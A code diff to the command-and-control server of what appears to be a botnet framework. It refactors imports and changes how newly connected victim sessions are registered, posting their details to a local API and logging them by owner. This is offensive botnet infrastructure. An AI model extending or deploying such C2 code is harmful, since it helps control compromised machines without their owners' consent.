@@ -17,6 +17,7 @@ import pprint
 import inspect
 import hashlib
 import argparse
+import requests
 import threading
 import subprocess
 import collections
@@ -28,9 +29,9 @@ if sys.version_info[0] > 2:
     sys.path.append('core')
     sys.path.append('modules')
 
-from buildyourownbotnet.models import db
-from buildyourownbotnet.core import security, util
-from buildyourownbotnet.core.dao import session_dao
+from .models import db
+from .core import security, util
+from .core.dao import session_dao
 
 # globals
 __threads = {}
@@ -215,31 +216,32 @@ class C2(threading.Thread):
 
     @util.threaded
     def serve_until_stopped(self):
-        print('testing serve')
         while True:
             
             connection, address = self.socket.accept()
 
             session = SessionThread(connection=connection, c2=self)
-            print(session)
             if session.info != None:
 
                 # database stores identifying information about session
-                session_dict = session_dao.handle_session(session.info)
-                session.id = session_dict['id']
+                response = requests.post('http://0.0.0.0:5000/api/session/new', json=dict(session.info))
+                if response.ok:
+                    
+                    session_metadata = response.json()
+                    session_uid = session.info.get('uid')
 
-                # display session information in terminal
-                session_dict.pop('new', None)
-                session.info = session_dict
+                    # display session information in terminal
+                    session_metadata.pop('new', None)
+                    session.info = session_metadata
 
-                # add session to user sessions dictionary
-                owner = session.info.get('owner')
-                if owner not in self.sessions:
-                    self.sessions[owner] = {}
+                    # add session to user sessions dictionary
+                    owner = session.info.get('owner')
+                    if owner not in self.sessions:
+                        self.sessions[owner] = {}
 
-                self.sessions[owner][session.info.get('uid')] = session
+                    self.sessions[owner][session_uid] = session
 
-                print('New session {}:{} connected'.format(owner, session.info.get('uid')))
+                    util.log('New session {}:{} connected'.format(owner, session_uid))
 
             else:
                 util.log("Failed Connection: {}".format(address[0]))
